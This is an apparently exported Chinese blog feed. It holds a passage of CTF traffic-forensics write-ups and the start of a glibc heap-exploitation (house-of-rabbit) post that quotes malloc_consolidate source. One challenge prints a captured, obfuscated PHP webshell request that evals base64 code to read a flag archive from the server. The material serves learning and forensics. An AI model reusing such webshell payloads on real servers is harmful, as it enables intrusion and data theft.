src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202630510.png" alt="image-20250307202630510"></p><ul><li>这时我们不能使用导出对象了，我们还是按照题目4中提取压缩包的方法来。提取的是服务器发送给客户机的。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202730295.png" alt="image-20250307202730295"></p><ul><li>下载下来后可以正常解压缩，这样我们解压缩后就会找到<code>flag</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG&#123;China_Ch0pper_Is_A_Slick_Little_Webshe11&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202859303.png" alt="image-20250307202859303"></p><h2 id="题目6_文件提取2"><a href="#题目6-文件提取2" class="headerlink" title="题目6_文件提取2"></a>题目6_文件提取2</h2><ul><li><p>题目描述：无</p></li><li><p>打卡流量包后，注意到流量包有点多，就先查看一下流量统计，发现有<code>FTP</code>文件，这时就会想到流量中可能可以导出文件。</p></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203124294.png" alt="image-20250307203124294"></p><ul><li>这时我们直接导出对象，发现可以导出<code>hehehe.rar</code>，导出后的压缩包可以正常打开，但是需要密码才能解压</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203319977.png" alt="image-20250307203319977"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203304340.png" alt="image-20250307203304340"></p><ul><li>这时我们就继续去寻找一下流量包中是否有密码，这时我们在流<code>5</code>中找到了这个密码<code>0rvWprrs0NOz9se9wLQ=</code>，现在先来尝试<code>base64</code>解码，发现是乱码</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203529876.png" alt="image-20250307203529876"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Snipaste_2025-03-07_20-36-20.png" alt="Snipaste_2025-03-07_20-36-20"></p><ul><li>在翻找的过程中我们还发现了流<code>4</code>中有发送一个<code>png</code>图片，经典png头，导出的png图片没啥作用</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203727917.png" alt="image-20250307203727917"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307204308046.png" alt="image-20250307204308046"></p><ul><li>接下来我们猜想前面的<code>base64</code>是<code>gpk</code>编码的<code>base64</code>，发现确实是<code>gbk</code>编码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&#x27;0rvWprrs0NOz9se9wLQ=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(a).decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一枝红杏出墙来</span></span><br></pre></td></tr></table></figure><ul><li>看wp发现密码能解的开，但是我这边密码解不开QAQ，这里就直接贴<code>wp</code>了，解压之后就是修复<code>png</code>文件头，这样就可以打开图片得到flag了</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307205718514.png" alt="image-20250307205718514"></p><h2 id="题目7_导出对象1"><a href="#题目7-导出对象1" class="headerlink" title="题目7_导出对象1"></a>题目7_导出对象1</h2><ul><li><p>题目名称：流量中的线索.pcapng</p></li><li><p>题目描述：无</p></li><li><p>打开流量包，就先查看统计分析的包，发现<code>http</code>协议数据最多</p></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307205851278.png" alt="image-20250307205851278"></p><ul><li>这时我们就追踪一下流，发现有访问一个文件<code>fenxi.php</code></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210012289.png" alt="image-20250307210012289"></p><ul><li>然后就直接看看能不能提取对象：</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210040093.png" alt="image-20250307210040093"></p><ul><li>发现可以，就将<code>fenxi.php</code>文件提取出来，打开发现是非常大一串的编码，猜测是图片进行了<code>base64</code>编码</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210119640.png" alt="image-20250307210119640"></p><ul><li>这时我们就<code>base64</code>解码成图片看看，发现确实是这样的，并且flag在图片中。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210255036.png" alt="image-20250307210255036"></p><h2 id="题目8_导出对象2"><a href="#题目8-导出对象2" class="headerlink" title="题目8_导出对象2*"></a>题目8_导出对象2*</h2><ul><li><p>题目名称：Misc-我抓到你了</p></li><li><p>题目描述：无</p></li><li>打开包，继续查看统计，发现还是<code>http</code>协议这边字节占比最大</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210620670.png" alt="image-20250307210620670"></p><ul><li>这里就直接追踪http流，发现流<code>0</code>中，用户就发送了一个数据给服务器，并且访问的是<code>1.php</code>这个文件，这个应该是一个<code>webshell</code>文件。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210716496.png" alt="image-20250307210716496"></p><ul><li>我们分析发送的这一串数据，不知道怎么去除，不知道这个是什么，没怎么学web，应该是<code>PHP的RCE</code>这边</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&#x27;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9Ii92YXIvd3d3L2ZsYWcuemlwIjskZnA9QGZvcGVuKCRGLCdyJyk7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oJ0VSUk9SOi8vIENhbiBOb3QgUmVhZCcpO307ZWNobygiWEBZIik7ZGllKCk7&#x27;));\&quot;);&quot;));</span><br><span class="line"></span><br><span class="line">//分析得到的结果如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目9_导出对象3"><a href="#题目9-导出对象3" class="headerlink" title="题目9_导出对象3*"></a>题目9_导出对象3*</h2><ul><li>题目名：fly.pcapng</li><li>题目描述：无</li></ul>]]></content>
    
    
    <summary type="html">前言：学习流量分析，准备比赛</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-rabbit</title>
    <link href="http://iyheart.github.io/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/"/>
    <id>http://iyheart.github.io/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/</id>
    <published>2025-03-03T14:46:21.000Z</published>
    <updated>2025-03-21T16:11:44.931Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>house-of-rabbit</code>利用就被称为<code>fastbin_dup_consolidate</code>利用。</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="malloc_consolidate函数"><a href="#malloc-consolidate函数" class="headerlink" title="malloc_consolidate函数"></a>malloc_consolidate函数</h2><ul><li>在<code>malloc</code>中有一个函数，这个函数是一个特别的版本的<code>free</code>和<code>合并</code>，之前我们在<code>malloc</code>流程分析的时候会看到有<code>free</code>和<code>合并</code>，这个操作就是通过<code>malloc_consolidate</code>这个函数来实现的。<code>consolidate</code>在英文中就有合并的意思。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250306150614976.png" alt="image-20250306150614976"></p><ul><li>我们就来介绍一下这个函数的具体过程：<ul><li><code>malloc_consolidate</code>首先会从存储堆块大小更小的fastbin逐一遍历里面的chunk，每遍历到一个chunk，就会处理这个chunk<ul><li>如果这个chunk的<code>prev_inuse</code>位为<code>0</code>就会进行后向合并</li><li>如果这个chunk的相邻高地址chunk是<code>top_chunk</code>，它就会和<code>top_chunk</code>合并</li><li>如果这个chunk的相邻高地址chunk是空闲的，该chunk就会进行前向合并</li><li><code>chunk</code>如果没有与<code>top chunk</code>相邻就会使用头插法将<code>被处理的chunk</code>放入<code>unsorted bin</code>中</li><li>如果<code>chunk</code>的<code>size</code>不在<code>smallbin</code>的范围内就先会设置<code>fd_nextsize</code>和<code>bk_nextsize</code>为<code>NULL</code></li></ul></li></ul></li></ul><h2 id="触发malloc_consolidate函数"><a href="#触发malloc-consolidate函数" class="headerlink" title="触发malloc_consolidate函数"></a>触发malloc_consolidate函数</h2><ul><li>现在我们来探究一下何时何时会触发这个函数。这里我参考的是实验部分的注释，实验部分的注释已经讲得很明白了，什么时候会触发<code>malloc_consolidate</code>函数。</li><li>这里我们就通过几个小而简短的代码，来看看如何触发<code>malloc_consolidate</code>函数。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> _int_malloc: 一个处于large sized范围的chunk正在被分配</span><br><span class="line"><span class="number">2.</span> _int_malloc: 没有适合的bins被寻找重新申请回去并且top chunk太小了不能满足<span class="built_in">malloc</span>的申请</span><br><span class="line"><span class="number">3.</span> _int_free: 如果这个chunk的大小&gt;= FASTBIN_CONSOLIDATION_THRESHOLD (<span class="number">65536</span>)</span><br><span class="line"><span class="number">4.</span> mtrim: 总是调用 </span><br><span class="line"><span class="number">5.</span> __libc_mallopt: 总是调用</span><br></pre></td></tr></table></figure><h2 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h2><ul><li>首先执行<code>consolidate</code>最重要的就是<code>malloc_consolidate</code>这个函数，主要就看<code>malloc_consolidate</code>主要的作用和<code>malloc</code>、<code>free</code>中何时调用<code>malloc_consolidate</code>这个函数</li></ul><details>    <summary>相关宏定义</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 告诉malloc之后要整理fastbin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取unsorted_bin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure></details><details>    <summary>malloc_consolidate</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><ul><li>接下来介绍触发<code>malloc_consolidate</code>这个函数的五个地方</li></ul><details>    <summary>_int_malloc_触发malloc__consolidate</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">    hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">    (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">    processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">    anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">    While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">    even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">    fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">    Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">    large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">    invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">    it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     idx = largebin_index (nb);</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">       malloc_consolidate (av);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><details>    <summary>_int_malloc中使用malloc_consolidate(top chunk)</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 